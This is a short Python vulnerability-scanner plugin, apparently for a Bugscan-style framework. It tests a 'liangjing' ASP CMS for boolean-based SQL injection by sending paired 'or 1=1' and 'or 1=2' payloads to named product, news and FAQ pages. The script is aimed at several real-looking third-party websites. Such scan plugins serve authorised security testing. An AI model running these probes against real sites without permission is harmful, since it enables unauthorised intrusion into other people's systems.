#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0107850

import re

def assign(service, arg):
    if service == "liangjing":
        return True, arg
        
        
        
def audit(arg): 
    payloads = [
        'Chinese/ProductShow.asp?ArticleID=-1',
        'Chinese/NewsInfo.asp?Action=Co&id=-1',
        'chinese/FaqInfo.asp?ID=-1',
        'English/En_ProductShow.asp?ArticleID=-1',
        'Chinese/Bs_ProductShow.asp?ArticleID=-1',
        'Chinese/Bs_NewsInfo.asp?Action=Co&id=-1',
        'Chinese/Bs_FaqInfo.asp?id=-1'
        ]
    getdata1 = '%20or%201%3D1'
    getdata2 = '%20or%201%3D2'
    for payload in payloads:
        url1 = arg + payload + getdata1
        url2 = arg + payload + getdata2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)
        if code1==200 and code2==200 and res1!=res2:
            security_hole(arg + payload + "  :found sql Injection")
    
    
    payloads = [
        'Chinese/Product.asp?BigClassName=-1',
        'English/En_Product.asp?EnBigClassName=-1',
        'Chinese/Bs_Product.asp?BigClassName=-1',
        ]
    getdata1 = '%27%20or%20%271%27%3D%271'
    getdata2 = '%27%20or%20%271%27%3D%272'
    for payload in payloads:
        url1 = arg + payload + getdata1
        url2 = arg + payload + getdata2
        code1, head, res1, errcode, _ = curl.curl2(url1)
        code2, head, res2, errcode, _ = curl.curl2(url2)
        if code1==200 and code2==200 and res1!=res2:
            security_hole(arg + payload + "  :found sql Injection")
    



if __name__ == '__main__':
    from dummy import *
    audit(assign('liangjing','http://www.leige.com.cn/')[1])
    #audit(assign('liangjing','http://www.shzxyy.com/')[1])
    #audit(assign('liangjing','http://www.3variables.sg/')[1])